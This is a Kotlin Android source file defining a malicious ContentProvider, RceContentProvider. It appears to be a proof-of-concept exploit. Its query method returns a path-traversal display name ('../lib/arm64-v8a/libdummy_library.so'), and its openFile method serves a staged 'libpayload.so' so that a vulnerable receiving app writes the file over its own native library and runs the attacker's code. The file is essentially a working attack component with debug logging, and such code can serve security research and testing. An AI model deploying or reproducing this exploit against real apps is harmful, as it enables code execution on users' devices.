package com.artexplorer.museum.data

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import java.io.File
import android.util.Log

import java.io.FileOutputStream
import java.io.InputStream

class RceContentProvider : ContentProvider() {

    private val maliciousFileName = "../lib/arm64-v8a/libdummy_library.so"

    override fun query(uri: Uri, projection: Array<String>?, sel: String?, args: Array<String>?, order: String?): Cursor {
        val cursor = MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME))
        cursor.addRow(arrayOf(maliciousFileName))
        return cursor
    }

    // In RceContentProvider.kt

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        try {
            Log.d("RceContentProvider", "🔥🔥🔥 openFile called!")

            val appContext = context ?: return null
            val nativeLibDir = appContext.applicationInfo.nativeLibraryDir
            Log.d("RceContentProvider", "Native lib dir: $nativeLibDir")

            val sourceLibFile = File(nativeLibDir, "libpayload.so")

            Log.d("RceContentProvider", "Looking for: ${sourceLibFile.absolutePath}")
            Log.d("RceContentProvider", "Source exists: ${sourceLibFile.exists()}")

            if (sourceLibFile.exists()) {
                Log.d("RceContentProvider", "Source size: ${sourceLibFile.length()} bytes")

                val stagedFile = File(appContext.cacheDir, "payload.so")
                sourceLibFile.inputStream().use { input ->
                    stagedFile.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }

                Log.d("RceContentProvider", "✅ Staged size: ${stagedFile.length()} bytes")
                return ParcelFileDescriptor.open(stagedFile, ParcelFileDescriptor.MODE_READ_ONLY)

            } else {
                Log.e("RceContentProvider", "❌ libpayload.so NOT FOUND!")

                // Create a recognizable dummy for testing
                val dummyFile = File(appContext.cacheDir, "dummy.so")
                FileOutputStream(dummyFile).use {
                    it.write("THIS_IS_DUMMY_PAYLOAD_29_BYTES".toByteArray())
                }
                Log.d("RceContentProvider", "Created dummy: ${dummyFile.length()} bytes")
                return ParcelFileDescriptor.open(dummyFile, ParcelFileDescriptor.MODE_READ_ONLY)
            }

        } catch (e: Exception) {
            Log.e("RceContentProvider", "❌ Exception: ${e.message}")
            return null
        }
    }

    override fun onCreate(): Boolean = true
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0
}